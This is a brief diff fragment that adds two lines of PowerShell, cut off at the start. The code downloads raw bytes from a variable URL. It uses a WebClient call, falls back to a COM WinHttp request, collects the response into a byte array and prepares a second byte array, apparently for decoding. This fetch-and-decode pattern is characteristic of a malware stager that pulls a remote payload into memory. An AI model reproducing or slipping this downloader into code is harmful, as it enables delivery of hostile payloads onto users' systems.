@@ -1,0 +1,2 @@
+w()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$ch+=[byte[]]$w.ResponseBody}}
+$xr=[byte[]]$c
